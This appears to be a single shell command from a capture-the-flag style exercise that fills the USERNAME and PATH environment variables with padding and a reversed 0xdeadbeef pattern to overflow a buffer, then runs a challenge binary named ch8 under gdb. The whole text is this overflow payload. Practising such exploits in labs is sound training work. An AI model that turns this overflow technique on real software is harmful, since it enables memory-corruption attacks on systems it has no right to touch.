USERNAME=$(python -c 'print "\xde\xad\xbe\xef"[::-1]*32') PATH=$PATH:$(python
-c 'print "A"*'$((127-${#PATH}+32))' + "\xde\xad\xbe\xef"[::-1]
+ "\xde\xad\xbe\xef"[::-1]') gdb ./ch8
